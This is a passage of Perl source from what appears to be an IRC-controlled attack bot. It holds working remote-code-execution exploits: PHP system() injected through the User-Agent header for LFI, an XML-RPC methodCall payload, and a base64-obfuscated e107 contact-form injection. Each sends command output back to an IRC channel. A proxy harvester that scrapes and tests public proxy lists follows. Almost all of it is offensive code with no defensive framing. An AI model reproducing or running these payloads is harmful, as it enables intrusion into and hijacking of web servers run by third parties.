my $url  = $_[0];
my $cmd  = $_[1];
my $chan = $_[2];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(7);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
&msg("$chan","15,1(4@9CMDLFI15)9 $1");
} else {
&msg("$chan","15,1(4@9CMDLFI15)4 No Output");
}
}

sub cmdxml() {
my $jed  = $_[0];
my $dwa  = $_[1];
my $chan = $_[2];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';system('".$dwa."');echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
&msg("$chan","15,1(4@9CMDXML15)9 $1");
} else {
&msg("$chan","15,1(4@9CMDXML15)4 No Output");
}
}

sub cmde107() {
my $path  = $_[0];
my $code = $_[1];
my $chan  = $_[2];
my $codecmd = encode_base64($code);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"));';
    my $req = HTTP::Request->new(POST => $path);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
&msg("$chan","15,1(4@9CMDe10715)9 $mydata");
}
else { &msg("$chan","15,1(4@9CMDe10715)4 No Output"); }
}

sub proxy() {

my $chan = $_[0];
my $reqip= "$_[1]";
	for ($b=0; $b<=5; $b+=1) {
	my $siteproxy = ("http://www.xroxy.com/proxylist.php?port=&type=Not_transparent&ssl=ssl&country=&latency=3000&reliability=&sort=latency&desc=&pnum=".$b."#table");
	$Resul = &get_content($siteproxy);
	print $Resul;
		while ($Resul =~ m/proxy&host=(.+?)&port=(.+?)&notes/g) {
		my $proip = $1;
		my $port  = $2;
		my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 2);
			if ($scansock && $proip =~ /^$reqip/) {
			my $url = 'http://www.cmyip.com/index.php';
			my $ua = LWP::UserAgent->new(agent => $uagent);
			$ua->timeout(1);
			$ENV{HTTP_proxy} = "http://".$proip.":".$port."/";
			$ua->env_proxy;
			my $req = HTTP::Request->new(GET => $url);
			my $res = $ua->request($req)->content;
			delete $ENV{HTTP_PROXY};
				if ($res =~ m/Quick and Easy way to SEE my IP address/g) {
				&msg("$chan","15,1(4@9PROXY15)(4@9My-PROXY15) 13Accept $proip:$port ");
				}
			}
		}
	}
	&msg("$chan","15,1(4@9PROXY15)13 Checking xroxy Finished");
	for ($b=0; $b<=5; $b+=1) {
	my $siteproxy = ("http://proxies.my-proxy.com/proxy-list-s".$b.".html");
	$Resul = &get_content($siteproxy);
	print $Resul;
		while ($Resul =~ m/<br>(.+?):(.+?)<br>/g) {
		my $proip = $1;
		my $port  = $2;
		my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 2);
			if ($scansock && $proip =~ /^$reqip/) {
			my $url = 'http://www.cmyip.com/index.php';
			my $ua = LWP::UserAgent->new(agent => $uagent);
			$ua->timeout(1);
			$ENV{HTTP_proxy} = "http://".$proip.":".$port."/";
			$ua->env_proxy;
			my $req = HTTP::Request->new(GET => $url);
			my $res = $ua->request($req)->content;
			delete $ENV{HTTP_PROXY};
				if ($res =~ m/Quick and Easy way to SEE my IP address/g) {
				&msg("$chan","15,1(4@9PROXY15)(4@13My-Proxy15)13Accept $proip:$port ");
				}
			}
		}
	}
	&msg("$chan","15,1(4@9PROXY15)13 Checking my-proxy Finished");
	for ($b=0; $b<=5; $b+=1) {
	my $siteproxy = ("http://www.cooleasy.com/?act=list&port=&type=elite&country=&page=".$b);
	$Resul = &get_content($siteproxy);
	print $Resul;
		while ($Resul =~ m/<td width=170>(.+?)<\/td>/g) {
		my $proip = $1;
		my @port  = ("80","8080","3128");
			foreach my $port (@port) {
			my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 2);
				if ($scansock && $proip =~ /^$reqip/) {
				my $url = 'http://www.cmyip.com/index.php';
				my $ua = LWP::UserAgent->new(agent => $uagent);
				$ua->timeout(1);
				$ENV{HTTP_proxy} = "http://".$proip.":".$port."/";
				$ua->env_proxy;
				my $req = HTTP::Request->new(GET => $url);
				my $res = $ua->request($req)->content;
				delete $ENV{HTTP_PROXY};
					if ($res =~ m/Quick and Easy way to SEE my IP address/g) {
					&msg("$chan","15,1(4@9PROXY15)(4@13CoolEasy15) 13Accept $proip:$port ");
					}
				}
			}
		}
	}
	&msg("$chan","9,1(4@9PROXY15)13 Checking cooleasy Finished");
 }